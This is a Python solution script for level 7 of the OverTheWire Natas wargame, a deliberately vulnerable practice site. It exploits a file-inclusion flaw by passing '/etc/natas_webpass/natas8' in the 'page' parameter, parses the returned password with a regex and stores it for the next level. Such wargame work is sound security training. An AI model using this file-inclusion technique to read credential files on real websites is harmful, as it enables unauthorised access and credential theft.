import requests
import natas
import base64
import re

URL='http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'

def main():
    usr = 'natas7'
    password = natas.get_credential(usr)
    b64 = base64.b64encode('%s:%s' % (usr,password))
    
    response = requests.get (
            URL,
            headers = {
                'Authorization': 'Basic %s' % b64
            }
    )

    regex = r"<br>\n(\w+)"
    matches = re.finditer(regex,response.content, re.MULTILINE)
    
    found_password = None
    for matchNum, match in enumerate(matches, start=1):
        found_password = match.group(1)
        break

    if found_password is not None:
        print('found password: %s' % found_password)
        print('adding to credentials file....')
        natas.save_credentials('natas8',found_password)
        print('done')

#    print('DEBUG: credentials - %s' % natas.get_credentials())

if __name__=='__main__':
    main()
